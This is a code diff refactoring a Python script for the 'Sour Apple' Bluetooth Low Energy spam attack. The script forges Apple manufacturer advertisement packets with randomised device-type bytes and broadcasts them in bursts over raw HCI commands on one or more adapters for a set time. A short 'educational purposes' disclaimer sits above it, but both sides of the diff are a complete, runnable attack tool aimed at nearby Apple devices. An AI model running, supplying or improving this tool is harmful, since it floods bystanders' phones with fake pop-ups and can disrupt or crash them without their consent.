@@ -11,94 +11,79 @@ WARNING: This is for educational purposes only. Use responsibly and only on devi
 you own or have permission to test.
 """
 
-import random
-import bluetooth._bluetooth as bluez
-from time import sleep
-import struct
-import socket
-import array
-import threading
+from colors import RED, GREEN, BLUE, CYAN, WHITE, YELLOW, RESET, BRIGHT
 import time
 import os
+import struct
 import fcntl
+import array
+import socket
+import threading
 from errno import EALREADY
+import bluetooth._bluetooth as bluez
+from time import sleep
+import random
+import sys
+
+# Apple device type IDs (used in manufacturer data)
+APPLE_TYPES = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
 
 
-# ANSI Color codes
-RED = "\033[31m"
-GREEN = '\033[32m'
-BLUE = '\033[34m'
-CYAN = '\033[36m'
-WHITE = '\033[37m'
-YELLOW = '\033[33m'
-RESET = "\033[0m"
-BRIGHT = '\033[1m'
-
-
-def setup_device(device_id):
-    """Setup the Bluetooth device for advertising."""
+def enable_hci_device(device_id):
+    """Enable and prepare HCI device for advertising."""
     try:
-        hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
-        req_str = struct.pack("H", device_id)
-        request = array.array("b", req_str)
-        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
-    except IOError as e:
-        if e.errno != EALREADY:
+        raw_socket = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
+        hci_data = struct.pack("H", device_id)
+        hci_req = array.array("b", hci_data)
+        fcntl.ioctl(raw_socket.fileno(), bluez.HCIDEVUP, hci_req[0])
+    except IOError as ioerr:
+        if ioerr.errno != EALREADY:
             raise
     finally:
-        hci_sock.close()
+        raw_socket.close()
 
 
-def send_packet(sock, delay=1):
-    """
-    Send fake Apple device advertisement packet.
+def build_apple_adv(dev_id):
+    """Generate Apple advertisement packet."""
+    typ = random.choice(APPLE_TYPES)
+    payload = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, typ,
+               random.randint(0, 255), random.randint(0, 255), random.randint(0, 255),
+               0x00, 0x00, 0x10, random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+    return payload
+
+
+def send_adv_on_device(sock, delay=1):
+    """Send Apple advertisement on specified socket."""
+    pkt = build_apple_adv(sock)
     
-    Uses various Apple device type identifiers to create diverse advertisements.
-    """
-    # Apple device type identifiers
-    types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
-    
-    # Build BLE advertisement packet with random Apple device identifier
-    bt_packet = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
-                 random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
-                 random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
-    
-    # Advertising parameters: min_interval, max_interval, type, own_addr_type, peer_addr_type, peer_addr (6 bytes), chan_map, filter_policy
-    # Type 3 = Scannable undirected advertising (better for being discovered)
-    struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
-    
-    # Set advertising parameters
-    cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
-    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)
+    cfg = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
+    cmd = struct.pack("<HHBBB6BBB", *cfg)
+    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd)
     time.sleep(0.01)
     
-    # Enable advertising
-    cmd_pkt = struct.pack("<B", 0x01)
-    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
+    on_cmd = struct.pack("<B", 0x01)
+    bluez.hci_send_cmd(sock, 0x08, 0x000A, on_cmd)
     time.sleep(0.01)
     
-    # Set advertising data
-    cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
-    bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)
+    pkt_cmd = struct.pack("<B%dB" % len(pkt), len(pkt), *pkt)
+    bluez.hci_send_cmd(sock, 0x08, 0x0008, pkt_cmd)
     time.sleep(0.01)
     
-    # Keep advertising active for the delay period (don't disable immediately)
     sleep(delay)
     
-    # Then disable advertising
-    cmd_pkt = struct.pack("<B", 0x00)
-    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
+    off_cmd = struct.pack("<B", 0x00)
+    bluez.hci_send_cmd(sock, 0x08, 0x000A, off_cmd)
     time.sleep(0.01)
 
 
 def ad_spam(device_ids, duration=60, interval=0.1):
     """
-    Main Apple advertisement spam attack function.
+    Apple advertisement spam execution.
     
     Args:
-        device_ids (list): List of HCI device identifiers (e.g., ["hci0", "hci1"])
-        duration (int): Duration of the attack in seconds
-        interval (float): Interval between packets in seconds (0.1-1.0 recommended)
+        device_ids (list): Target HCI devices
+        duration (int): Runtime in seconds
+        interval (float): Packet interval in seconds
     """
     
     print(f"{GREEN}{BRIGHT}Sour Apple Attack Initiated...{RESET}{BLUE}")
@@ -106,16 +91,15 @@ def ad_spam(device_ids, duration=60, interval=0.1):
     socks = []
     
     try:
-        # Parse device IDs and setup
-        for device_label in device_ids:
-            device_id = int(device_label.replace("hci", ""))
-            print(f"Setting up {device_label}...")
-            setup_device(device_id)
+        for dev_label in device_ids:
+            dev_id = int(dev_label.replace("hci", ""))
+            print(f"Setting up {dev_label}...")
+            enable_hci_device(dev_id)
             try:
-                sock = bluez.hci_open_dev(device_id)
-                socks.append((device_label, sock))
-            except Exception as e:
-                print(f"{RED}Unable to connect to Bluetooth hardware {device_label}: {e}{RESET}")
+                s = bluez.hci_open_dev(dev_id)
+                socks.append((dev_label, s))
+            except Exception as ex:
+                print(f"{RED}HCI open failed on {dev_label}: {ex}{RESET}")
         
         if not socks:
             print(f"{RED}No Bluetooth devices available!{RESET}")
@@ -126,44 +110,39 @@ def ad_spam(device_ids, duration=60, interval=0.1):
         print(f"{YELLOW}Duration: {duration} seconds, Interval: {interval} seconds{RESET}")
         print(f"{YELLOW}TIP: For better results, keep interval at 0.1-0.5 seconds{RESET}\n")
         
-        start_time = time.time()
-        packet_count = 0
-        burst_count = 0
+        tick = time.time()
+        pkt_count = 0
+        burst_no = 0
         
-        # Send packets for specified duration
-        while time.time() - start_time < duration:
-            burst_count += 1
+        while time.time() - tick < duration:
+            burst_no += 1
             
-            # Send advertisement burst on all devices
-            for device_label, sock in socks:
+            for dev_label, sock in socks:
                 try:
-                    # Send packet with the specified interval
-                    send_packet(sock, delay=interval)
-                    packet_count += 1
+                    send_adv_on_device(sock, delay=interval)
+                    pkt_count += 1
                     
-                    # Print progress every 10 packets
-                    if packet_count % 10 == 0:
-                        elapsed = time.time() - start_time
-                        print(f"{CYAN}Packets: {packet_count} | Bursts: {burst_count} | Elapsed: {elapsed:.1f}s{RESET}", end='\r')
+                    if pkt_count % 10 == 0:
+                        elapsed = time.time() - tick
+                        print(f"{CYAN}Packets: {pkt_count} | Bursts: {burst_no} | Elapsed: {elapsed:.1f}s{RESET}", end='\r')
                     
-                except Exception as e:
-                    print(f"{RED}Error sending packet on {device_label}: {e}{RESET}")
+                except Exception as ex:
+                    print(f"{RED}Tx error on {dev_label}: {ex}{RESET}")
         
-        print()  # New line after progress
+        print()
         print(f"\n{GREEN}Attack completed!{RESET}")
-        print(f"{CYAN}Total packets sent: {packet_count}{RESET}")
-        print(f"{CYAN}Total bursts: {burst_count}{RESET}")
+        print(f"{CYAN}Total packets sent: {pkt_count}{RESET}")
+        print(f"{CYAN}Total bursts: {burst_no}{RESET}")
         
     except KeyboardInterrupt:
         print(f"\n{YELLOW}Attack interrupted by user{RESET}")
-    except Exception as e:
-        print(f"{RED}An error occurred: {e}{RESET}")
+    except Exception as ex:
+        print(f"{RED}An error occurred: {ex}{RESET}")
     finally:
-        # Disable advertising and close all sockets
-        for device_label, sock in socks:
+        for dev_label, sock in socks:
             try:
-                cmd_pkt = struct.pack("<B", 0x00)
-                bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
+                cmd = struct.pack("<B", 0x00)
+                bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd)
                 sock.close()
             except:
                 pass
@@ -172,16 +151,5 @@ def ad_spam(device_ids, duration=60, interval=0.1):
 
 
 if __name__ == "__main__":
-    # For testing: run with default parameters
-    import sys
-    devices = ["hci0"]
-    if len(sys.argv) > 1:
-        devices = sys.argv[1:]
-    
-    ad_spam(device_ids=devices, duration=60, interval=0.1)
-
-    ad_spam(inf=args.devices)
-
-
-if __name__ == "__main__":
-    main()
+    devs = sys.argv[1:] if len(sys.argv) > 1 else ["hci0"]
+    ad_spam(device_ids=devs, duration=60, interval=0.1)
